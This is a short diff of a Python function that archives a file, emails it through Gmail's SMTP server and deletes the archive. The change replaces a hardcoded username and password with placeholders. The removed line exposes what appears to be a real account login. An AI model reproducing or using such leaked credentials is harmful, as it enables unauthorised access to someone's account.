@@ -36,7 +36,7 @@ def rar_and_send():
         my.add_content(CONTENT)
         my.add_attch(rar_file)
         # print my.mail
-        my.send_mail("smtp.gmail.com", "idsinglefunny", "id1t2j3k")
+        my.send_mail("smtp.gmail.com", "username", "password")
         # print rar_file
         os.remove(rar_file)
         # print "sending......"
